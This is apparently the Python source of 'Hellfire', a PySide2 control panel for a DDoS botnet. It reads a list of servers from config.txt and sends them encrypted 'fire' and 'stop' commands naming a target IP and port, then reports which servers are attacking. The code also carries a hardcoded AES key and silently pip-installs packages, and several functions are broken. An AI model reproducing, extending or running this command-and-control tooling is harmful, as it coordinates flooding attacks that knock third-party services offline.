import sys
import re
import time
import json
import socket
from multiprocessing import Process
import os

try:
	from PySide2 import QtCore, QtGui, QtWidgets
except Exception:
	import os
	os.system('pip install PyQt5 PySide2')
	os.system('py -m pip install PyQt5 PySide2')
	from PySide2 import QtCore, QtGui, QtWidgets
try:
	import Crypto
	import datetime
	from Crypto.Cipher import AES
	from Crypto.Util.Padding import pad, unpad
except:
	os.system("pip install pycryptodome")
	os.system("py -m pip install pycryptodome")
	import Crypto
	import datetime
	from Crypto.Cipher import AES
	from Crypto.Util.Padding import pad, unpad

glpass = "MyVeryVeryVerySecretKey" + "A"*9 #password for AES

class SendSignal(QtCore.QObject):
	sig = QtCore.Signal(str, str)

class SendCheckSignal(QtCore.QObject):
	sig = QtCore.Signal(str)

class CheckThread(QtCore.QThread):#first Thread for sending check message
	def __init__(self, parent = None):
		QtCore.QThread.__init__(self, parent)
		self.signal = SendCheckSignal()
		self.command = "checkServer"#default command to Send
		self.host = ""
		self.port = 0

	def run(self):#sending Check command and creating a socket
		try:
			sock = socket.socket()
			sock.connect((self.host, self.port))
			jsonMessage = dojson(self.command, "", "")#Forming JSON message
			sock.settimeout(10)
			sock.send(aes_crypt(jsonMessage.encode('utf-8'), glpass, "encrypt"))#sending encode message + password + agument means that message will be crypted
			data = sock.recv(1024) #принимаем 1024 бита
		except OSError:
			data = aes_crypt(b"Failed to open connection.", glpass, "encrypt")#easiest way to catch mistake is to encrypt fail message
		try:
			self.signal.sig.emit(bytes.decode(aes_crypt(data, glpass, "decrypt")))
		except ValueError:
			self.signal.sig.emit("Data is not encrypted")

class formCheckThread(QtCore.QThread):#second thread for marking by color servers from txt file
	def __init__(self, parent = None):
		QtCore.QThread.__init__(self, parent)

	def run(self):
		self.send_threads()#function that read ip and ports from file
		ui.check_thread.wait()
		for i in range(ui.verticalLayout.count()):
			if checkArray[i]:
				ui.verticalLayout.itemAt(i).widget().setStyleSheet("color: green")
			else:
				ui.verticalLayout.itemAt(i).widget().setStyleSheet("color: red")


	def send_threads(self):
		config = open('config.txt','r').read().replace('\n','')
		for server_info in re.split(r'\|',config):
			ui.check_thread.wait()
			ui.check_thread.host = re.split(r':',server_info)[1]
			ui.check_thread.port = int(re.split(r':',server_info)[2])
			ui.check_thread.start()


class FirstThread(QtCore.QThread):
	def __init__(self, parent = None):
		QtCore.QThread.__init__(self, parent)
		self.signal = SendSignal()
		self.command = "fire"
		self.target = ""
		self.tport = 0
		self.host = ""
		self.port = 0

	def run(self):
		try:
			sock = socket.socket()
			sock.connect((self.host, self.port))
			jsonMessage = dojson(self.command, self.target, self.tport)
			#print(jsonMessage)
			#print(aes_crypt(jsonMessage.encode('utf-8'), glpass, "encrypt"))
			sock.send(aes_crypt(jsonMessage.encode('utf-8'), glpass, "encrypt"))
			data = sock.recv(1024)
			#print(bytes.decode(aes_crypt(data, glpass, "decrypt")))
		except OSError:
			data = aes_crypt(b"Failed to open connection.", glpass, "encrypt")
		try:
			self.signal.sig.emit(bytes.decode(aes_crypt(data, glpass, "decrypt")), self.host)
		except ValueError:
			self.signal.sig.emit("Data is not encrypted", self.host)

class SendingThread(QtCore.QThread):
	def __init__(self, parent = None):
		QtCore.QThread.__init__(self, parent)
		self.command = "fire"
		self.target = ""
		self.tport = 0

	def run(self):
		send_threads(self.command, self.target, self.tport)

	def send_threads(command, target, port):
		config = open('config.txt','r').read().replace('\n','')
		for server_info in re.split(r'\|',config):
			checkArray = formCheckArray()
			if checkArray[int(re.split(r':',server_info)[0])-1]:
				ui.first_thread.wait()
				ui.first_thread.host = re.split(r':',server_info)[1]
				ui.first_thread.port = int(re.split(r':',server_info)[2])
				ui.first_thread.target = target
				ui.first_thread.tport = port
				ui.first_thread.command = command
				ui.first_thread.start()

def aes_crypt(text, password, mode):
	#Инициализируется шифратор с заданным паролем и модом
	cipher = AES.new(bytes(password,'utf-8'), AES.MODE_ECB)
	#в зависимости от mode функции запускается шифрование или дешифровка
	if mode == 'encrypt':
		outtext = cipher.encrypt(pad(text,32)) #pad используется для выравнивания входных данных по длине блока
	elif mode == 'decrypt':
		outtext = unpad(cipher.decrypt(text),32)
	else:
		pass
	return outtext


def dojson(command, target, tport):
	json_list = {"command":command,"target":target,"tport":tport}
	message = json.dumps(json_list)
	return message

checkArray = []

class Ui_Form(object):

	def finished(self, data, iphost):
		try:
			unJsonData = json.loads(data)
			unJsonData2 = json.loads(unJsonData['data'])
			if unJsonData['output'] == 'Fire started':
				self.textBrowser.setText(self.textBrowser.toPlainText() + 'Attacking target ' + unJsonData2['target'] + ' from IP: ' + iphost + '\n')
			elif unJsonData['output'] == 'Fire stopped':
				self.textBrowser.setText(self.textBrowser.toPlainText() + 'Attack from IP: ' + iphost + ' is stopped \n')
			else:
				self.textBrowser.setText(self.textBrowser.toPlainText() + ' server ' + iphost + ' \n')
		except json.decoder.JSONDecodeError:
			self.textBrowser.setText(self.textBrowser.toPlainText() + 'from IP: ' + iphost + " "+ data + " \n")

	def finishedcheck(self, data):
		global checkArray
		try:
			if json.loads(data,object_hook=output) == 'server is working':
				checkArray.append(True)
			else:
				checkArray.append(False)
		except json.decoder.JSONDecodeError:
			checkArray.append(False)


	def setupUi(self, Form):

		self.first_thread = FirstThread()
		self.first_thread.signal.sig.connect(self.finished)

		self.check_thread = CheckThread()
		self.check_thread.signal.sig.connect(self.finishedcheck)

		self.send_thread = SendingThread()
		self.form_check_thread = formCheckThread()
		#self.send_thread.signal.sig.connect(self.finished)



		config = open('config.txt','r').read().replace('\n','')
		serv_num = len(re.split(r'\|',config))+1
		Form.setObjectName("Form")
		Form.setFixedSize(868, 500)
		Form.setWindowOpacity(0.85)
		Form.setStyleSheet("background-color: black; color: #3ede43;")


		self.verticalLayoutWidget = QtWidgets.QWidget(Form)
		self.verticalLayoutWidget.setGeometry(QtCore.QRect(720, 50, 131, 400))
		self.verticalLayoutWidget.setObjectName("verticalLayoutWidget")


		self.scrollArea = QtWidgets.QScrollArea(self.verticalLayoutWidget)
		self.scrollArea.setGeometry(QtCore.QRect(0, 0, 131, 250))
		self.scrollAreaWidgetContents = QtWidgets.QWidget()
		self.scrollAreaWidgetContents.setGeometry(QtCore.QRect(0, 0, 131, 30*serv_num))
		self.scrollArea.setWidget(self.scrollAreaWidgetContents)


		self.verticalLayout = QtWidgets.QVBoxLayout(self.scrollAreaWidgetContents)
		self.verticalLayout.setContentsMargins(0, 0, 0, 0)
		self.verticalLayout.setObjectName("verticalLayout")

		for serv_id in re.split(r'\|',config):
			checkBox = QtWidgets.QCheckBox(self.verticalLayoutWidget)
			checkBox.setText(QtWidgets.QApplication.translate("Form", "Server "+ re.split(r':',serv_id)[0], None, -1))
			self.verticalLayout.addWidget(checkBox)


		self.label = QtWidgets.QLabel(Form)
		self.label.setGeometry(QtCore.QRect(720, 10, 191, 31))

		font = QtGui.QFont()
		font.setPointSize(14)
		self.label.setFont(font)
		self.label.setObjectName("label")
		self.label_2 = QtWidgets.QLabel(Form)
		self.label_2.setGeometry(QtCore.QRect(30, 30, 211, 41))
		font = QtGui.QFont()
		font.setPointSize(14)
		self.label_2.setFont(font)
		self.label_2.setObjectName("label_2")
		self.label_4 = QtWidgets.QLabel(Form)
		self.label_4.setGeometry(QtCore.QRect(40, 150, 201, 41))
		font = QtGui.QFont()
		font.setPointSize(14)
		self.label_4.setFont(font)
		self.label_4.setObjectName("label_4")
		self.pushButton_start = QtWidgets.QPushButton(Form)
		self.pushButton_start.setGeometry(QtCore.QRect(330, 80, 61, 30))
		self.pushButton_start.setObjectName("pushButton")
		self.pushButton_start.setStyleSheet("background-color: #232423;")
		'''
		ADD
		'''
		self.pushButton_convertIntoIP = QtWidgets.QPushButton(Form)
		self.pushButton_convertIntoIP.setGeometry(QtCore.QRect(330, 30, 80, 41))
		self.pushButton_convertIntoIP.setObjectName("convertIntoIP")
		self.pushButton_convertIntoIP.setStyleSheet("background-color: #232423;")
		self.pushButton_stop = QtWidgets.QPushButton(Form)
		self.pushButton_stop.setGeometry(QtCore.QRect(410, 80, 61, 30))
		self.pushButton_stop.setObjectName("pushButton_2")
		self.pushButton_stop.setStyleSheet("background-color: #232423;")
		self.pushButton_select = QtWidgets.QPushButton(Form)
		self.pushButton_select.setGeometry(QtCore.QRect(720, 310, 131, 20))
		self.pushButton_select.setObjectName("pushButton_4")
		self.pushButton_select.setStyleSheet("background-color: #232423;")
		self.pushButton_unselect = QtWidgets.QPushButton(Form)
		self.pushButton_unselect.setGeometry(QtCore.QRect(720, 335, 131, 20))
		self.pushButton_unselect.setObjectName("pushButton_unselect")
		self.pushButton_unselect.setStyleSheet("background-color: #232423;")
		self.pushButton_filter = QtWidgets.QPushButton(Form)
		self.pushButton_filter.setGeometry(QtCore.QRect(720, 360, 131, 20))
		self.pushButton_filter.setObjectName("pushButton_filter")
		self.pushButton_filter.setStyleSheet("background-color: #232423;")
		self.pushButton_check = QtWidgets.QPushButton(Form)
		self.pushButton_check.setGeometry(QtCore.QRect(720, 385, 131, 20))
		self.pushButton_check.setObjectName("pushButton_check")
		self.pushButton_check.setStyleSheet("background-color: #232423;")
		self.textBrowser = QtWidgets.QTextBrowser(Form)
		self.textBrowser.setGeometry(QtCore.QRect(30, 200, 671, 205))
		self.textBrowser.setObjectName("textBrowser")

		self.lineEdit_host = QtWidgets.QLineEdit(Form)
		self.lineEdit_host.setGeometry(QtCore.QRect(50, 80, 130, 30))#300, 110, 130, 30
		self.lineEdit_host.setObjectName("lineEdit_host")
		self.lineEdit_host.setAlignment(QtCore.Qt.AlignCenter)
		'''
		ADD
		'''
		self.lineEdit_DNS = QtWidgets.QLineEdit(Form)
		self.lineEdit_DNS.setGeometry(QtCore.QRect(110, 30, 211, 41))#300, 110, 130, 30
		self.lineEdit_DNS.setObjectName("lineEdit_DNS")
		self.lineEdit_DNS.setAlignment(QtCore.Qt.AlignCenter)
		self.lineEdit_port = QtWidgets.QLineEdit(Form)
		self.lineEdit_port.setGeometry(QtCore.QRect(230, 80, 50, 30))
		self.lineEdit_port.setObjectName("lineEdit_port")
		self.lineEdit_port.setAlignment(QtCore.Qt.AlignCenter)
		self.label_host = QtWidgets.QLabel(Form)
		self.label_host.setGeometry(QtCore.QRect(30, 80, 20, 30)) #280 , 110, 50, 30
		self.label_host.setObjectName("label_host")
		self.lineTextVersion = QtWidgets.QLabel(Form)
		self.lineTextVersion.setGeometry(QtCore.QRect(80, 420, 800, 60))
		self.lineTextVersion.setObjectName("lineTextVersion")
		self.lineTextVersion.setStyleSheet("color: red")
		self.lineTextVersion.setFont(QtGui.QFont("Comic Sans MS", 28, QtGui.QFont.Bold))

		self.label_port = QtWidgets.QLabel(Form)
		self.label_port.setGeometry(QtCore.QRect(190, 80, 30, 30))
		self.label_port.setObjectName("label_port")
		sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Fixed)
		sizePolicy.setHorizontalStretch(0)
		sizePolicy.setVerticalStretch(0)

		self.retranslateUi(Form)
		QtCore.QMetaObject.connectSlotsByName(Form)

	def retranslateUi(self, Form):
		Form.setWindowTitle(QtWidgets.QApplication.translate("Form", "Hellfire v 1.0.1 ", None, -1))
		self.label.setText(QtWidgets.QApplication.translate("Form", "Servers list:", None, -1))
		self.label_2.setText(QtWidgets.QApplication.translate("Form", "Target:", None, -1))
		self.label_4.setText(QtWidgets.QApplication.translate("Form", "Output Data:", None, -1))
		self.label_host.setText(QtWidgets.QApplication.translate("Form", "IP:", None, -1))
		self.lineEdit_DNS.setText(QtWidgets.QApplication.translate("Form", "DNS name", None, -1))
		self.pushButton_convertIntoIP.setText(QtWidgets.QApplication.translate("Form", "DNS to IP", None, -1))
		self.label_port.setText(QtWidgets.QApplication.translate("Form", "PORT:", None, -1))
		self.lineEdit_host.setText(QtWidgets.QApplication.translate("Form", "144.0.2.180", None, -1))
		self.lineEdit_port.setText(QtWidgets.QApplication.translate("Form", "80", None, -1))
		self.pushButton_start.setText(QtWidgets.QApplication.translate("Form", "Run", None, -1))
		self.pushButton_stop.setText(QtWidgets.QApplication.translate("Form", "Stop", None, -1))
		self.pushButton_select.setText(QtWidgets.QApplication.translate("Form", "Select All", None, -1))
		self.pushButton_unselect.setText(QtWidgets.QApplication.translate("Form", "Unselect All", None, -1))
		self.pushButton_check.setText(QtWidgets.QApplication.translate("Form", "Check servers", None, -1))
		self.pushButton_filter.setText(QtWidgets.QApplication.translate("Form", "Clean", None, -1))
		self.lineTextVersion.setText(QtWidgets.QApplication.translate("Form", "☠ Hellfire controll panel v 1.0.1", None, -1))
		self.textBrowser.setHtml(QtWidgets.QApplication.translate("Form", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7.8pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:\'MS Shell Dlg 2\';\"><br /></p></body></html>", None, -1))


app = QtWidgets.QApplication(sys.argv)
Form = QtWidgets.QWidget()
ui = Ui_Form()
ui.setupUi(Form)
Form.show()

def isServerSelected():
	#checkServ = False
	for i in range(ui.verticalLayout.count()):
		checkServ = False
		if ui.verticalLayout.itemAt(i).widget().isChecked() == True:
			return True

def stop():
	if isServerSelected() == True:
		if ui.lineEdit_host.text().replace('.',"").isdigit() == False:
			ui.textBrowser.setText(ui.textBrowser.toPlainText() + 'Oooops... You need to write IP-address format not exec commands :)\n')
		else:
			ui.send_thread.target = ui.lineEdit_host.text()
			ui.send_thread.tport = ui.lineEdit_port.text()
			ui.send_thread.command = "stop"
			ui.textBrowser.setText(ui.textBrowser.toPlainText() + "Processing stop command... \n")
			ui.send_thread.start()
	else:
		ui.textBrowser.setText(ui.textBrowser.toPlainText() + "First, you need to select server from your server list \n")

def output(comm):
	return comm['output']

def colorChange():
	global checkArray
	checkArray = []
	ui.form_check_thread.start()


logDict = {}

def loggingToDict(serverName, message):
		if serverName in logDict:
				x = logDict[serverName]
				x = message
				logDict[serverName]=x
		else:
				logDict[serverName]=message

def showingInfo():
	checkArray = formCheckArray()
	x = ""
	for i, v in enumerate(checkArray):
		if v == True:
			x = x + logDict.get(str(i+1))
			ui.textBrowser.setText(x)


def refresh():
	config = open('config.txt','r').read().replace('\n','')

	for server_info in re.split(r'\|',config):
		message = send_command(server_info, ui.lineEdit_refresh.text())
		ui.textBrowser.setText(ui.textBrowser.toPlainText() + message)

def checkIPorNot():
	if ui.lineEdit_host.text().replace('.',"").isdigit() == False:
		self.textBrowser.setText(self.textBrowser.toPlainText() + 'Invalid input target IP \n')


def run_button():
	#в цикле для все серверов
	#получить таргет и порт
	if isServerSelected() == True:
		if ui.lineEdit_host.text().replace('.',"").isdigit() == False:
			ui.textBrowser.setText(ui.textBrowser.toPlainText() + 'Oooops... You need to write IP-address format not exec commands :)\n')
		else:
			ui.send_thread.target = ui.lineEdit_host.text()
			ui.send_thread.tport = ui.lineEdit_port.text()
			ui.send_thread.command = "fire"
			ui.send_thread.start()
	else:
		ui.textBrowser.setText(ui.textBrowser.toPlainText() + "First, you need to select server from your server list \n")
	#забиндить в поток и запустить
	#send_threads(command, target, port)
def convertIntoIP():
	#IP = lineEdit_DNS.text()
	try:
		ui.lineEdit_host.setText(socket.gethostbyname(ui.lineEdit_DNS.text()))# socket.gethostbyname(ui.lineEdit_DNS.text())
	except socket.gaierror:
		ui.textBrowser.setText(ui.textBrowser.toPlainText() + 'Invalid DNS name or not exist!\n')


def send_threads(command, target, port):
	config = open('config.txt','r').read().replace('\n','')
	for server_info in re.split(r'\|',config):
		checkArray = formCheckArray()
		if checkArray[int(re.split(r':',server_info)[0])-1]:
			ui.first_thread.wait()
			ui.first_thread.host = re.split(r':',server_info)[1]
			ui.first_thread.port = int(re.split(r':',server_info)[2])
			ui.first_thread.target = target
			ui.first_thread.tport = port
			ui.first_thread.command = command
			ui.first_thread.start()


def formCheckArray():
	checkArray = []
	for i in range(ui.verticalLayout.count()):
		checkArray.append(ui.verticalLayout.itemAt(i).widget().isChecked())
	return checkArray

def selectAll():
	for i in range(ui.verticalLayout.count()):
		ui.verticalLayout.itemAt(i).widget().setCheckState(QtCore.Qt.CheckState(2))

def unselectAll():
	for i in range(ui.verticalLayout.count()):
		ui.verticalLayout.itemAt(i).widget().setCheckState(QtCore.Qt.CheckState(0))

def wait():
	time.sleep(int(ui.spinBox.value())*60)

def delayed():
	while ui.checkBox_autorefresh.isChecked():
		send_threads(ui.lineEdit_refresh.text())
		time

def clean():
	ui.textBrowser.setText("")







ui.pushButton_start.clicked.connect(run_button)
ui.pushButton_select.clicked.connect(selectAll)
ui.pushButton_unselect.clicked.connect(unselectAll)
ui.pushButton_stop.clicked.connect(stop)
ui.pushButton_convertIntoIP.clicked.connect(convertIntoIP)
#ui.pushButton_clean.clicked.connect(clean)
ui.pushButton_filter.clicked.connect(clean)
ui.pushButton_check.clicked.connect(colorChange)
#ui.pushButton_run.clicked.connect(dnsampl)

sys.exit(app.exec_())
